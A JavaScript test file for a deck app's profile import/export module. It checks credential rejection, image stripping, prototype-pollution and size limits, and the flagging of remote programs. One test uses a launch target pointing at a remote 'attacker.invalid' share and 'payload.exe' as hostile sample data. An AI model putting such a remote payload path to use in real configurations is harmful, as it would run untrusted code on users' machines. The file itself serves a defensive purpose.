'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { test } = require('node:test');
const { decodeExchange, encodeExchange, prepareExchange, suggestedName, readExchangeFile, writeExchangeFile } =
  require('../src/main/profile-exchange');
const { prepareTemplatePages } = require('../src/shared/profile-template-import');
const { tempDir } = require('./helpers/temp-dir');

const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aN4QAAAAASUVORK5CYII=';
const ref = (scope, name) => ({ expression: { scope, var: name } });
const linkedKey = { id: 'studio', label: 'Studio', controlId: 'scene-control', image: PNG };
const sample = () => ({
  name: 'Meeting / Work', grid: { cols: 4, rows: 2 },
  variables: [{ id: 'studio', type: 'string', value: 'Main studio' }],
  macros: [{ id: 'scene', label: 'Change scene', parameters: [{ id: 'name', type: 'string' }],
    action: { type: 'obs-scene', scene: { parameter: 'name' } } }],
  controlBindings: [{ id: 'scene-control', label: 'Studio controls', action: { type: 'macro', macro: 'scene',
    args: { name: ref('profile', 'studio') } } }],
  pages: [
    {
      id: 'first', name: 'First', grid: { cols: 3, rows: 2 }, apps: ['Code.exe'],
      keys: [
        linkedKey,
        { id: 'local-image', label: 'Local image', image: '\\\\example.invalid\\share\\icon.png',
          action: { type: 'sequence', steps: [
            { type: 'launch', target: '%ProgramFiles%\\Tools\\Task.exe' },
            { type: 'open', target: 'https://example.org/private-path' },
            { type: 'workspace', workspace: 'meeting' },
          ] } },
      ],
      widgets: [{ id: 'cpu', type: 'system-metric', layout: { column: 0, row: 1, cols: 1, rows: 1 } }],
    },
    { id: 'second', name: 'Second', keys: [{ id: 'note', label: 'Note', action: { type: 'text', text: 'Example typed text' } }] },
  ],
  bar: { keys: [{ ...linkedKey, id: 'bar-studio' }] },
  obs: { endpoint: 'ws://127.0.0.1:4455' },
});

test('profile exchange retains attached actions, variables and embedded art, and lists only portable dependencies', (t) => {
  const source = sample();
  const prepared = prepareExchange('profile', source);
  const { summary, bundle } = prepared;
  assert.equal(summary.keys, 4);
  assert.equal(summary.widgets, 1);
  assert.equal(summary.removedImages, 1);
  assert.deepEqual(summary.actions, { 'obs-scene': 2, sequence: 1, launch: 1, open: 1, workspace: 1, text: 1 });
  assert.deepEqual(summary.dependencies, {
    applications: ['code.exe'], programs: ['Task.exe'], links: ['example.org'], workspaces: ['meeting'],
    obsScenes: ['Main studio'], providers: ['Lastra telemetry', 'OBS WebSocket'],
  });
  assert.equal(bundle.item.pages[0].keys[0].image, PNG);
  assert.equal(bundle.item.pages[0].keys[1].image, undefined);
  assert.equal(bundle.item.obs, undefined);
  assert.deepEqual(bundle.item.variables, source.variables);
  assert.deepEqual(bundle.item.macros, source.macros);
  assert.deepEqual(bundle.item.controlBindings, source.controlBindings);
  assert.equal(bundle.item.bar.keys[0].controlId, 'scene-control');
  assert.match(source.pages[0].keys[1].image, /^\\\\/);
  assert.equal(suggestedName(summary), 'Meeting-Work-profile.lastra.json');

  const directory = tempDir(t, 'lastra-exchange-');
  const file = path.join(directory, suggestedName(summary));
  const { text } = encodeExchange(bundle);
  writeExchangeFile(file, text);
  writeExchangeFile(file, text);
  const reopened = readExchangeFile(file);
  assert.throws(() => writeExchangeFile(file, '{}', [file]), /separate exchange file/);
  assert.deepEqual(reopened.bundle, bundle);
  assert.equal(reopened.summary.removedImages, 0);
  assert.deepEqual(fs.readdirSync(directory), [path.basename(file)]);
  assert.equal(decodeExchange('\uFEFF' + JSON.stringify(source)).summary.removedImages, 1);
});

test('page export materializes shared behavior without copying unrelated profile or integration settings', () => {
  const source = sample();
  source.pages[1].keys[0].action.text = 'password=private';
  const { bundle, summary } = prepareExchange('page', source, 'first');
  const page = bundle.item;
  assert.deepEqual(page.grid, { cols: 3, rows: 2 });
  assert.equal(page.keys[0].controlId, undefined);
  assert.deepEqual(page.keys[0].action, { type: 'obs-scene', scene: 'Main studio' });
  assert.equal(page.widgets[0].id, 'cpu');
  assert.equal(summary.removedImages, 1);
  assert.equal(summary.macros, 0);
  const target = { grid: { cols: 8, rows: 4 }, pages: [{ id: 'keep', name: 'First', apps: ['code.exe'], keys: [] }] };
  const exchange = decodeExchange(encodeExchange(bundle).text).bundle;
  const inserted = prepareTemplatePages(target, { grid: exchange.item.grid, pages: [exchange.item] }, () => 'imported');
  assert.equal(inserted.pages[0].name, 'First · copy');
  assert.deepEqual(inserted.pages[0].grid, source.pages[0].grid);
  assert.deepEqual(inserted.pages[0].apps, []);
  assert.deepEqual(inserted.collisions, [{ page: 'First · copy', value: 'code.exe' }]);
  assert.equal(target.pages.length, 1);
  assert.throws(() => prepareExchange('profile', source), /configure them separately/);
});

test('exchange rejects malformed content, overlarge files, and identified credentials', () => {
  assert.throws(() => decodeExchange('{'), /valid JSON/);
  assert.throws(() => decodeExchange('{"format":"lastra.exchange","version":9}'), /unsupported/i);
  assert.throws(() => decodeExchange('{"workspaces":[]}'), /choose a Lastra profile/i);
  assert.throws(() => decodeExchange('{"keys":[],"__proto__":{"polluted":true}}'), /unsupported field/i);
  assert.throws(() => decodeExchange(Buffer.alloc(16 * 1024 * 1024 + 1)), /at most 16 MB/i);
  const target = 'https://example.org/item?code=IT&key=display-name';
  const link = prepareExchange('profile', { keys: [{ id: 'open', action: { type: 'open', target } }] });
  assert.equal(link.bundle.item.pages[0].keys[0].action.target, target);

  for (const action of [
    { type: 'open', target: 'https://person:secret@example.org/' },
    { type: 'open', target: 'https://example.org/?X-Amz-Signature=secret' },
    { type: 'open', target: 'https://example.org/#access_token=secret' },
    { type: 'launch', target: 'app.exe', args: ['--api-key', 'example-value'] },
    { type: 'text', text: 'Bearer test_token_12345' },
    { type: 'text', text: 'password=%PASSWORD% access_token=test_value' },
  ]) {
    const profile = { keys: [{ id: 'test', action }] };
    assert.throws(() => prepareExchange('profile', profile), /configure them separately/);
    assert.throws(() => decodeExchange(JSON.stringify(profile)), /configure them separately/);
  }
  const file = sample();
  file.obs.password = 'configuration-value';
  assert.throws(() => prepareExchange('profile', file), /configure them separately/);
  const ordinary = { name: 'Password manager', keys: [{ id: 'test', action: { type: 'launch', target: 'app.exe',
    args: ['--api-key', '%DESTINATION_KEY%'] } }] };
  assert.doesNotThrow(() => prepareExchange('profile', ordinary));
});

test('profile exchange lists network programs and non-HTTPS links in full', () => {
  const page = { id: 'remote', name: 'Remote', keys: [{ id: 'mute', label: 'Mute', action: { type: 'sequence', steps: [
    { type: 'launch', target: String.raw`\\attacker.invalid\share\payload.exe` },
    { type: 'open', target: 'http://example.org/x' },
    { type: 'open', target: '//attacker.invalid/share/doc.lnk' },
  ] } }] };
  const { summary } = prepareExchange('profile', { name: 'Remote', grid: { cols: 2, rows: 1 }, pages: [page] });
  assert.deepEqual(summary.dependencies.programs, [String.raw`\\attacker.invalid\share\payload.exe`]);
  assert.deepEqual(summary.dependencies.links, ['//attacker.invalid/share/doc.lnk', 'http://example.org']);
});
